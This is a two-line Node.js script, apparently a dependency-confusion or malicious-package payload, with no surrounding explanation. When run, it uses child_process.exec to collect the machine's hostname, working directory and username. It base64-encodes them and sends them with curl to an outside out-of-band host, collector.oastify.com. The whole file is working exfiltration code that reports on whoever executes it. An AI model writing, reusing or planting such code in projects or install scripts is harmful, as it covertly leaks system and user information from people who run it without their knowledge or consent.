const { exec } = require("child_process");

exec("a=$(hostname;pwd;whoami;) && b=$(echo $a | base64) && curl -X POST collector.oastify.com -d $b");
